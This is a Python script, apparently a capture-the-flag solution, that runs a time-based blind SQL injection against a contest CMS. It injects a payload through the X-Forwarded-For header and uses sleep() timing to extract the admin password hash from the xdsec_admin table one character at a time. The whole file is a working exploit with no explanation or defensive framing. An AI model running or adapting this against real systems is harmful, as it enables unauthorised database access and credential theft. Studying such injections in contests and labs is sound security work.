#!/usr/bin/env python

import requests
import sys
import time

try:
    range = xrange
except NameError as e:
    pass

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36',
}
payloads = list('abcdef0123456789')
#payloads = list('@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._')

print('start to retrive MySQL infomation:')

def run():
    user = ''
    for i in range(1,33):
        for payload in payloads:
            try:
                headers["X-FORWARDED-FOR"] = "1.2.3.4' or if(ord(substr((select password \
                    from xdsec_admin limit 1),{offset},1))={char},sleep(5),1) or '1'='2"\
                    .format(offset=i, char=ord(payload))
                req = requests.get("http://xdsec-cms-12023458.xdctf.win/th3r315adm1n.php/log", 
                    headers=headers, 
                    timeout=3)
            except KeyboardInterrupt as e:
                sys.exit(0)
            except:
                user += payload
                print('\n[In progress] ' + user)
                break
            sys.stdout.write('.')
            sys.stdout.flush()

    print('\n[Done]infomation is ' + user)

if __name__ == "__main__":
    run()
